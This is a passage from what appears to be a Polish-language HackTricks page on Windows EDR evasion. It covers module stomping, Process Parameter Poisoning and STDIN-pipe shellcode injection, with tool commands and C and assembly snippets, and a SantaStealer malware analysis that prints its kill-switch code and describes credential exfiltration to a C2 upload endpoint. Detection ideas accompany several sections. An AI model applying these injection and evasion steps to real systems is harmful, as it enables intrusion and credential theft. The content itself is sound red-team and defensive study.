- Wielokrotne użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów dispatch wewnątrz podpisanych modułów.


## Precyzyjne Module Stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL-a już zmapowanego w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nowy, poświęcany DLL. Miejsce nadpisania powinno znajdować się w **załadowanym obrazie opartym na pliku**, którego obszar kodu pomieści payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny przebieg pracy:

1. Wylicz moduły procesu docelowego i zachowaj **listę dozwolonych nazw** już załadowanych DLL-i.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydatów DLL na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zmapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stomping.
5. Oblicz **promień rażenia**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe narzędzia pomocnicze do rozpoznania/wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj DLL-e **już załadowane** do procesu zdalnego, aby uniknąć telemetryki związanej z `LoadLibrary`/nieoczekiwanymi załadowaniami obrazów.
- Preferuj eksporty, które aplikacja docelowa rzadko wykonuje; w przeciwnym razie normalne ścieżki kodu mogą trafić na zmodyfikowane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode’u: zamiast literału ciągu użyj **tablicy bajtów/inicjalizatora w nawiasach klamrowych**, aby cały bufor został poprawnie uwzględniony w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do stron wykonywalnych opartych na obrazie (`MEM_IMAGE`, `PAGE_EXECUTE*`), zamiast częstszych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie odpowiadają plikowi źródłowemu na dysku.
- Zdalne wątki lub zmiany kontekstu wykonania rozpoczynające działanie w obrębie eksportu legalnej DLL, którego początkowe bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / omijania EDR**, która pozwala uniknąć klasycznej ścieżki zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatrucie, kopiowane przez `CreateProcessW`

Przydatne nośniki:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia dotyczące nośników:

- `lpCommandLine` musi wskazywać na **zapisywalną pamięć**, aby można go było użyć w `CreateProcessW`. Jego limit wynosi **32,767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode zawierającym kolejne ciągi `NAME=VALUE\0` i zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem transferu payloadu**. Operator tworzy proces potomny z danymi startowymi kontrolowanymi przez atakującego, a Windows wykonuje kopię między procesami.

### Zdalne wyszukiwanie bez zdalnych API zapisu

Po utworzeniu procesu potomnego odszukaj skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Przejdź do `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów ma zwykle uprawnienia `RW`, a nie wykonywalne. Typowy łańcuch P3 wygląda tak:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Ustaw wybraną stronę parametrów jako wykonywalną za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisanie `RIP`)

W przeciwieństwie do klasycznych metod przejmowania wątku, **nie jest wymagane** użycie `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku interfejsów API często monitorowanych pod kątem wstrzykiwania:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i wieloetapowy shellcode

Wszystkie trzy nośniki zawierają **ciągi znaków lub dane przypominające ciągi**, dlatego surowy payload zawierający `0x00` zostaje obcięty podczas transferu. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie wykonywania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych z użyciem XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

To pozwala pierwszemu etapowi tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode'u drugiego etapu bez osadzania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do tego obszaru, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Autorzy wskazują następujące obiecujące kierunki poszukiwań:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zmieniające **strony parametrów procesu na wykonywalne**
- następująca po tej zmianie ochrony operacja `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie lub o wysokiej entropii wartości `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielna, pełna metoda wykonania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie wykorzystuje podejrzane prymitywy, takie jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Iniekcja przez pipe STDIN konsoli

Interaktywny proces potomny konsoli może również służyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do pipe'a i wysyła znacznik, po którym następuje shellcode. Gdy program konsolowy odczyta dane do własnej, prywatnej pamięci, injector odnajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to iniekcja procesu, a nie ogólna metoda omijania EDR.<sup>[[41]](#references)</sup>

Mimo opisu „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **pipe anonimowy**. Windows implementuje pipe'y anonimowe za pomocą wewnętrznych obiektów pipe o unikatowych nazwach, ale PoC nie wybiera ścieżki `\\.\pipe\<name>` ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt do odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia przekazany plik wykonywalny konsoli; nie podpina pipe'a do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referencyjny przebieg działania

Implementacja wykorzystuje następujący łańcuch:<sup>[[41]](#references)</sup>

1. Utwórz pary anonimowych pipe'ów dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij duplikaty uchwytów po stronie procesu potomnego w procesie nadrzędnym po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane uchwyty standardowe.
3. Wyślij całą tablicę binarną `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsolowy odczytuje bajty i pozostawia ich kopię w jednym ze swoich prywatnych, zatwierdzonych obszarów pamięci.
4. Przejdź przez przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj kandydackie regiony `MEM_PRIVATE` przy użyciu `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień ochronę odnalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, wstrzymaj go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywalne bajty zaczynają się pod offsetem szesnastkowym `0x19`. Podczas zastępowania payloadu zachowaj ten układ albo odpowiednio zaktualizuj znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako bad characters. Ten przepływ pracy nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Wzorce tworzenia małych natywnych narzędzi pomocniczych i kompilowania payloadów opisano w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Taktyki SantaStealer służące do unikania wykrycia bezplikowego i kradzieży poświadczeń

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne infostealery łączą omijanie AV, techniki antyanalizy i dostęp do poświadczeń w jednym przepływie działania.<sup>[[24]](#references)</sup>

### Weryfikacja układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryje układ cyrylicki, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie aktywuje się w wykluczonych lokalizacjach, pozostawiając przy tym artefakt przydatny do polowania na zagrożenia.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, hashuje każdą nazwę za pomocą niestandardowej sumy kontrolnej opartej na schemacie rolling checksum i porównuje ją z osadzonymi listami blokowanych nazw debuggerów/sandboxów; powtarza obliczanie sumy dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i wykonuje pomiary czasu wokół uśpienia, by wykrywać single-stepping. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + podwójne reflective loading ChaCha20

- Główna DLL/EXE zawiera osadzony helper do pozyskiwania danych uwierzytelniających z Chromium, który jest zapisywany na dysku lub ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje importy/relokacje, więc nie powstają żadne pliki pomocnicze.
- Ten helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowaną ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu etapach odszyfrowywania ładuje blob przez reflective loading (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają reflective process hollowing z direct syscall, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/karty kredytowe bezpośrednio z baz danych SQLite, mimo wzmocnień ABE.


### Modularne pozyskiwanie danych w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników do funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarek itp.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45-sekundowym okresie oczekiwania na zakończenie wątków raportuje liczbę plików.
- Po zakończeniu całość jest pakowana za pomocą statycznie linkowanej biblioteki `miniz` do `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` odczekuje 15 s i przesyła archiwum strumieniowo w porcjach po 10 MB przez HTTP POST do `http://<C2>:6767/upload`, podszywając się pod boundary przeglądarki `multipart/form-data` (`----WebKitFormBoundary***`). Każda porcja zawiera `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a w ostatniej porcji dodaje `complete: true`, aby C2 wiedziało, że składanie danych zostało zakończone.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)

{{#include ../banners/hacktricks-training.md}}
